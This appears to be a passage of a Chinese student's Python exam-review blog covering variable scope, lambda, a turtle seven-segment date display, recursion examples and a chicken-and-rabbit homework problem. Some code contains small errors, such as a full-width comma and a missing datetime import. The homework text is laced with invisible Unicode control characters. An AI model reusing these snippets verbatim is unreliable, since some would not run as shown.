<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n,s=<span class="number">10</span>，<span class="number">100</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n</span>):</span><br><span class="line">    s=<span class="number">1</span></span><br><span class="line"><span class="comment">#fact()函数中s是局部变量,与全局变量s不同</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        s*=i</span><br><span class="line">    <span class="keyword">return</span> s <span class="comment">#此处局部变量s是3628800</span></span><br><span class="line"><span class="built_in">print</span>(fact(n),s) <span class="comment">#此处全局变量s是100</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">3628800</span> <span class="number">100</span></span><br></pre></td></tr></table></figure>

<p><strong>规则2：局部变量为组合数据类型且未创建，等同于全局变量</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ls =[<span class="string">&quot;F&quot;</span>,<span class="string">&quot;f&quot;</span>] <span class="comment">#通过使用&quot;真实创建了一个全局变量列表ls</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a</span>):</span><br><span class="line">    ls.append(a) <span class="comment">#此处ls是列表类型，未真实创建，则等同于全局变量</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">func(<span class="string">&quot;c&quot;</span>) <span class="comment">#全局变量ls被修改</span></span><br><span class="line"><span class="built_in">print</span>(ls)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure>

<h2 id="lambda函数"><a href="#lambda函数" class="headerlink" title="lambda函数"></a>lambda函数</h2><p>&lt;函数名&gt;&#x3D; lambda&lt;参数&gt;:&lt;表达式&gt;</p>
<p>def &lt;函数名&gt;(&lt;参数&gt;):</p>
<pre><code>   &lt;函数体&gt;
   return&lt;返回值&gt;
</code></pre>
<p><strong>lambda函数返回函数名作为结果</strong></p>
<p>lambda函数是一种匿名函数，<strong>即没有名字的函数</strong>。使用lambda保留字定义，函数名是返回结果。lambda函数用于定义简单的、能够在一行内表示的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;f= <span class="keyword">lambda</span> x,y:x+y</span><br><span class="line">&gt;&gt;&gt;f(<span class="number">10</span>,<span class="number">15</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line">&gt;&gt;&gt;f= <span class="keyword">lambda</span>:<span class="string">&quot;lambda函数&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(f())</span><br></pre></td></tr></table></figure>

<p>lambda函数主要用作一些特定函数或方法的参数</p>
<p>lambda函数有一些固定使用方式，建议逐步掌握</p>
<p>一般情况，建议使用def定义的普通函数</p>
<h2 id="七段数码管绘制"><a href="#七段数码管绘制" class="headerlink" title="七段数码管绘制"></a>七段数码管绘制</h2><p><strong>七段数码管绘制时间</strong></p>
<p>步骤1：绘制单个数字对应的数码管</p>
<p>七段数码管由7个基本线条组成，七段数码管可以有固定顺序，不同数字显示不同的线条</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2070.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawLine</span>(<span class="params">draw</span>): <span class="comment">#绘制单段数码管</span></span><br><span class="line">    turtle.pendown() <span class="keyword">if</span> draw <span class="keyword">else</span> turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">40</span>)</span><br><span class="line">    turtle.right(<span class="number">90</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDigit</span>(<span class="params">digit</span>): <span class="comment">#根据数字绘制七段数码管</span></span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    turtle.left(<span class="number">180</span>)</span><br><span class="line">    turtle.penup() <span class="comment">#为绘制后续数字确定位置</span></span><br><span class="line">    turtle.fd(<span class="number">20</span>)  <span class="comment">#为绘制后续数字确定位置</span></span><br></pre></td></tr></table></figure>

<p>步骤2：获得一串数字，绘制对应的数码管</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2071.png" alt="image.png"></p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2072.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawLine</span>(<span class="params">draw</span>):   <span class="comment">#绘制单段数码管</span></span><br><span class="line">    …(略)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDigit</span>(<span class="params">digit</span>): <span class="comment">#根据数字绘制七段数码管</span></span><br><span class="line">    …(略)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDate</span>(<span class="params">date</span>):   <span class="comment">#获得要输出的数字</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> date:</span><br><span class="line">        drawDigit(<span class="built_in">eval</span>(i))  <span class="comment">#通过eval()函数将数字变为整数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    turtle.setup(<span class="number">800</span>, <span class="number">350</span>, <span class="number">200</span>, <span class="number">200</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(-<span class="number">300</span>)</span><br><span class="line">    turtle.pensize(<span class="number">5</span>)</span><br><span class="line">    drawDate(<span class="string">&#x27;20181010&#x27;</span>)</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line">main() </span><br></pre></td></tr></table></figure>

<p>增加七段数码管之间线条间隔</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawGap</span>():   <span class="comment">#绘制数码管间隔</span></span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawLine</span>(<span class="params">draw</span>):   <span class="comment">#绘制单段数码管</span></span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.pendown() <span class="keyword">if</span> draw <span class="keyword">else</span> turtle.penup()</span><br><span class="line">    turtle.fd(<span class="number">40</span>)</span><br><span class="line">    drawGap()</span><br><span class="line">    turtle.right(<span class="number">90</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDigit</span>(<span class="params">digit</span>): <span class="comment">#根据数字绘制七段数码管</span></span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    drawLine(<span class="literal">True</span>) <span class="keyword">if</span> digit <span class="keyword">in</span> [<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>] <span class="keyword">else</span> drawLine(<span class="literal">False</span>)</span><br><span class="line">    …(略)</span><br></pre></td></tr></table></figure>

<p>步骤3：获得系统时间，绘制对应的数码管</p>
<p>使用datetime库获得系统当前时间，增加年月日标记，年月日颜色不同</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle, time</span><br><span class="line">…(略)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDate</span>(<span class="params">date</span>):  <span class="comment">#data为日期，格式型如&#x27;2023-03=24+&#x27;</span></span><br><span class="line">    turtle.pencolor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> date:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;年&#x27;</span>,font=(<span class="string">&quot;Arial&quot;</span>, <span class="number">18</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.pencolor(<span class="string">&quot;green&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">40</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;月&#x27;</span>,font=(<span class="string">&quot;Arial&quot;</span>, <span class="number">18</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">            turtle.pencolor(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">            turtle.fd(<span class="number">40</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            turtle.write(<span class="string">&#x27;日&#x27;</span>,font=(<span class="string">&quot;Arial&quot;</span>, <span class="number">18</span>, <span class="string">&quot;normal&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            drawDigit(<span class="built_in">eval</span>(i)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">…(略)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle, time</span><br><span class="line">…(略)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drawDate</span>(<span class="params">date</span>):   </span><br><span class="line">…(略)  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    turtle.setup(<span class="number">800</span>, <span class="number">350</span>, <span class="number">200</span>, <span class="number">200</span>)</span><br><span class="line">    turtle.penup()</span><br><span class="line">    turtle.fd(-<span class="number">300</span>)</span><br><span class="line">    turtle.pensize(<span class="number">5</span>)</span><br><span class="line">    drawDate(datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m=%d+&#x27;</span>))</span><br><span class="line">    turtle.hideturtle()</span><br><span class="line">    turtle.done()</span><br><span class="line">main() </span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2073.png" alt="image.png"></p>
<h2 id="函数的递归"><a href="#函数的递归" class="headerlink" title="函数的递归"></a>函数的递归</h2><p>函数定义中调用函数自身的方式</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2074.png" alt="image.png"></p>
<p>类似数学归纳法</p>
<p>两个关键特征：</p>
<p><strong>链条：计算过程存在递归链条；基例：存在一个或多个不需要再次递归的基例</strong></p>
<p>如何实现？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fact</span>(<span class="params">n</span>):    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">return</span> n*fact(n-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><strong>函数 + 分支语句</strong></p>
<p>递归本身是一个函数，需要函数定义方式描述</p>
<p>函数内部，采用分支语句对输入参数进行判断</p>
<p>基例和链条，分别编写对应代码</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2075.png" alt="image.png"></p>
<p><strong>函数递归实例解析</strong></p>
<p>（1）字符串反转</p>
<p>将字符串s反转后输出：s[::-1]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rvs</span>(<span class="params">s</span>):    </span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&quot;&quot;</span> :</span><br><span class="line">         <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">         <span class="keyword">return</span> rvs(s[<span class="number">1</span>:])+s[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>经典的上台阶问题：给定整数N，代表台阶数，一次可以跨2个或者1个台阶，返回有多少种走法。</p>
<p>斐波那契数列：</p>
<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2076.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">n</span>):    </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">2</span>:</span><br><span class="line">	       <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>汉诺塔：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hanoi</span>(<span class="params">n,src,mid,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> count   </span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;-&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(src,dst))</span><br><span class="line">       count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">       hanoi(n-<span class="number">1</span>,src,dst,mid)</span><br><span class="line">       hanoi(<span class="number">1</span>,src,mid,dst)</span><br><span class="line">       hanoi(n-<span class="number">1</span>,mid,src,dst)</span><br><span class="line">hanoi(<span class="number">3</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/17/Python%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2077.png" alt="image.png"></p>
<h1 id="Python第三次作业"><a href="#Python第三次作业" class="headerlink" title="Python第三次作业"></a>Python第三次作业</h1><p><strong>1.鸡兔同笼</strong></p>
<p>有若干只鸡兔同在一个笼子里，从上面数，有35个头，从下面数，有94只脚，问笼中各有多少只鸡和兔？‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>请编一个程序，用户在同一行内输入两个整数，代表头和脚的数量，编程计算笼中各有多少只鸡和兔（假设鸡和兔都正常，无残疾）。如无解则输出“Data Error!‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬”‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p><strong>输入格式</strong>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>输入为一行，以空格分隔的两个整数h f，分别代表鸡兔的总头数和总脚数。‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p><strong>输出格式</strong>‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‮‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‪‬‪‬‪‬‪‬‪‬‪‬‮‬‫‬‭‬‪‬‪‬‪‬‪‬‪‬‮‬‭‬‫‬‪‬‪‬‪‬‪‬‪‬‮‬‪‬‮‬</p>
<p>使用输入值进行计算，如有解，则输出：有m只鸡，n只兔；如无解则输出Data Error!‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬‬</p>
